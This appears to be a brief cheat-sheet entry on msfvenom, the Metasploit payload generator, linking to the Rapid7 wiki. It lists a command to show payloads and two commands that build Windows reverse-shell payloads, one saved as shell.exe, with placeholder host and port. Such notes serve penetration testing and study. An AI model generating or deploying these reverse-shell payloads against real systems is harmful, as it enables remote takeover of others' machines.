# msfvenom
Msfvenom is the combination of payload generation and encoding.
[How to use msfvenom · rapid7/metasploit-framework Wiki · GitHub](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)


show available payloads
`msfvenom -l payloads`

generate shell examples
`msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port>`
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe`

- - - -